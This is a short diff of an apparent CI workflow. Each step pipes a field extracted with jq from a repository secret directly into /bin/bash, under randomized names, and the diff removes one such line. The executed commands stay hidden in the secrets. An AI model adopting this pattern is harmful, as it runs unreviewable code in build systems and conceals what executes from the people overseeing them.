@@ -17,7 +17,6 @@ jobs:
           q77241: ${{ secrets.q77241 }}
         run: |
           printf '%s' "$q77241" | jq -r .lmc0 | /bin/bash
-          printf '%s' "$t79" | jq -r .yjnqh065 | /bin/bash
           printf '%s' "$jukai932" | jq -r .pmhrw6 | /bin/bash
           printf '%s' "$lbkl7003" | jq -r .wajka361 | /bin/bash
 
